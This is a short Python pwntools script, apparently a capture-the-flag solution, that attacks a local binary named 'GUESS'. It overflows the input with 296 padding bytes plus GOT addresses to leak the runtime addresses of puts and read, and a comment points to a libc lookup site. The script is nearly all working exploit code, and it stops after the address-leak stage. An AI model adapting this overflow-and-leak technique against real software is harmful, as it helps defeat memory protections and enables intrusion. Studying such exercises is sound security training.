#/usr/bin/env python

'''
Find your libc.so here
https://libc.blukat.me/?q=puts%3A690%2Cread%3A250
'''
from pwn import *
#context.log_level =  "DEBUG"
p = process('./GUESS')
bin = ELF("./GUESS")
puts_got = bin.got['puts']
read_got = bin.got['read']

p.recvuntil("Please type your guessing flag\n")

p.sendline('a'*296 + p64(puts_got))
p.recvline()
p.recvuntil(": ")
puts_addr = u64(p.recv(6).ljust(8, "\x00"))
print "puts_addr: " + hex(puts_addr)
#gdb.attach(p)

p.recvuntil("Please type your guessing flag\n")

p.sendline('a'*296 + p64(read_got))
print p.recvline()
p.recvuntil(": ")
read_addr = u64(p.recv(6).ljust(8, "\x00"))
print "read_addr: " + hex(read_addr)